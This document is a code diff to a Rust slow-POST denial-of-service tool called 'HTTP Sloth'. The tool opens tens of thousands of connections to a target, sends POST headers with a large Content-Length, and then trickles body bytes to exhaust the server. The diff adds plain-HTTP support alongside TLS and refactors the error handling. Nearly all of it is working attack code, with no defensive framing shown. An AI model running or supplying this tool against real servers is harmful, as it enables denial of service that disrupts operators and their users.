@@ -1,31 +1,73 @@
-use std::convert::TryFrom;
-use std::io;
-use std::net::ToSocketAddrs;
-use std::sync::atomic::{AtomicUsize, Ordering};
-use std::sync::Arc;
-use std::thread::sleep;
-use std::time::Duration;
+use std::{
+    convert::TryFrom,
+    io,
+    net::ToSocketAddrs,
+    pin::Pin,
+    sync::{
+        Arc,
+        atomic::{AtomicUsize, Ordering},
+    },
+    task::{Context, Poll},
+    thread::sleep,
+    time::Duration,
+};
 
 extern crate clap;
 use clap::{Arg, Command};
 
+extern crate env_logger;
+use env_logger::{Builder, Env};
+
 #[macro_use]
 extern crate log;
 
-use tokio::io::AsyncWriteExt;
-use tokio::net::TcpStream;
-use tokio::time;
+use tokio::{
+    io::{AsyncWrite, AsyncWriteExt},
+    net::TcpStream,
+    time,
+};
 
 use tokio_rustls::{
-    rustls::pki_types::ServerName, rustls::ClientConfig, rustls::RootCertStore, TlsConnector,
+    TlsConnector,
+    client::TlsStream,
+    rustls::{ClientConfig, RootCertStore, pki_types::ServerName},
 };
 
 use url::Url;
 
+enum Unistream {
+    Plain(TcpStream),
+    Tls(Box<TlsStream<TcpStream>>),
+}
+
+impl AsyncWrite for Unistream {
+    fn poll_write(
+        self: Pin<&mut Self>,
+        cx: &mut Context<'_>,
+        buf: &[u8],
+    ) -> Poll<std::io::Result<usize>> {
+        match self.get_mut() {
+            Self::Plain(s) => Pin::new(s).poll_write(cx, buf),
+            Self::Tls(s) => Pin::new(s).poll_write(cx, buf),
+        }
+    }
+    fn poll_flush(self: Pin<&mut Self>, cx: &mut Context<'_>) -> Poll<std::io::Result<()>> {
+        match self.get_mut() {
+            Self::Plain(s) => Pin::new(s).poll_flush(cx),
+            Self::Tls(s) => Pin::new(s).poll_flush(cx),
+        }
+    }
+    fn poll_shutdown(self: Pin<&mut Self>, cx: &mut Context<'_>) -> Poll<std::io::Result<()>> {
+        match self.get_mut() {
+            Self::Plain(s) => Pin::new(s).poll_shutdown(cx),
+            Self::Tls(s) => Pin::new(s).poll_shutdown(cx),
+        }
+    }
+}
+
 #[tokio::main]
 async fn main() -> io::Result<()> {
-    std::env::set_var("RUST_LOG", "info");
-    env_logger::init();
+    Builder::from_env(Env::default().default_filter_or("info")).init();
 
     let arguments = Command::new("HTTP Sloth")
         .arg(Arg::new("url")
@@ -56,8 +98,11 @@ async fn main() -> io::Result<()> {
     let tick = Duration::from_secs(*arguments.get_one::<u64>("interval").unwrap_or(&50));
     let max_connections_count: usize = *arguments
         .get_one::<usize>("max-connections")
-        .unwrap_or(&32768);
-    let start = format!("POST {} HTTP/1.1\r\nContent-Type: application/x-www-form-urlencoded\r\nHost: {}\r\nContent-Length: {}\r\n\r\n", path, &host, content_length);
+        .unwrap_or(&32_768);
+    let start = format!(
+        "POST {} HTTP/1.1\r\nContent-Type: application/x-www-form-urlencoded\r\nHost: {}\r\nContent-Length: {}\r\n\r\n",
+        path, &host, content_length
+    );
     let addr = format!(
         "{}:{}",
         parsed_url.host_str().unwrap(),
@@ -67,22 +112,27 @@ async fn main() -> io::Result<()> {
     .unwrap()
     .next()
     .unwrap();
-
-    let mut root_store = RootCertStore::empty();
-
-    root_store.extend(webpki_roots::TLS_SERVER_ROOTS.iter().cloned());
-
-    let config = ClientConfig::builder()
-        .with_root_certificates(root_store)
-        .with_no_client_auth();
-
-    let tls_connector: TlsConnector = Arc::new(config).into();
+    let scheme = parsed_url.scheme().to_owned();
 
     let live_connections = Arc::new(AtomicUsize::new(0));
 
+    let maybe_tls_connector = if "https" == scheme {
+        let root_store = RootCertStore::from_iter(webpki_roots::TLS_SERVER_ROOTS.iter().cloned());
+
+        let config = ClientConfig::builder()
+            .with_root_certificates(root_store)
+            .with_no_client_auth();
+
+        let connector: TlsConnector = Arc::new(config).into();
+        let domain = ServerName::try_from(host).unwrap();
+        Some((connector, domain))
+    } else {
+        None
+    };
+
     {
         let mut interval = time::interval(Duration::from_secs(1));
-        let live_connections = Arc::clone(&live_connections);
+        let live_connections = live_connections.clone();
         tokio::spawn(async move {
             loop {
                 interval.tick().await;
@@ -95,7 +145,7 @@ async fn main() -> io::Result<()> {
     }
 
     loop {
-        let live_connections = Arc::clone(&live_connections);
+        let live_connections = live_connections.clone();
         if live_connections.load(Ordering::SeqCst) >= max_connections_count {
             sleep(Duration::from_secs(1));
             continue;
@@ -103,8 +153,7 @@ async fn main() -> io::Result<()> {
 
         let connection_number = live_connections.fetch_add(1, Ordering::SeqCst) + 1;
         let start = start.clone();
-        let tls_connector = tls_connector.clone();
-        let host = host.clone();
+        let tls_setup = maybe_tls_connector.clone();
 
         tokio::spawn(async move {
             let socket = TcpStream::connect(&addr).await.map_err(|e| {
@@ -114,21 +163,25 @@ async fn main() -> io::Result<()> {
                     connection_number, e
                 );
                 debug!("{}", message);
-                io::Error::new(io::ErrorKind::Other, message)
+                io::Error::other(message)
             })?;
 
-            let mut connection = tls_connector
-                .connect(ServerName::try_from(host).unwrap(), socket)
-                .await
-                .map_err(|e| {
-                    live_connections.fetch_sub(1, Ordering::SeqCst);
-                    let message = format!(
-                        "ERROR: tokio_tls::TlsConnector.connect: Connection number: {}: {}",
-                        connection_number, e
-                    );
-                    debug!("{}", message);
-                    io::Error::new(io::ErrorKind::Other, message)
-                })?;
+            let mut connection = if let Some((connector, domain)) = tls_setup {
+                Unistream::Tls(Box::new(connector.connect(domain, socket).await.map_err(
+                    |e| {
+                        live_connections.fetch_sub(1, Ordering::SeqCst);
+                        let message = format!(
+                            "ERROR: tokio_tls::TlsConnector.connect: Connection number: {}: {}",
+                            connection_number, e
+                        );
+                        debug!("{}", message);
+                        io::Error::other(message)
+                    },
+                )?))
+            } else {
+                Unistream::Plain(socket)
+            };
+
             // Write start
             AsyncWriteExt::write_all(&mut connection, start.as_bytes())
                 .await
@@ -139,7 +192,7 @@ async fn main() -> io::Result<()> {
                         connection_number, e
                     );
                     debug!("{}", message);
-                    io::Error::new(io::ErrorKind::Other, message)
+                    io::Error::other(message)
                 })?;
             let mut interval = time::interval(tick);
             tokio::spawn(async move {
@@ -154,7 +207,7 @@ async fn main() -> io::Result<()> {
                             connection_number, e
                         );
                         debug!("{}", message);
-                        io::Error::new(io::ErrorKind::Other, message)
+                        io::Error::other(message)
                     })?;
                 Ok::<(), io::Error>(())
             });
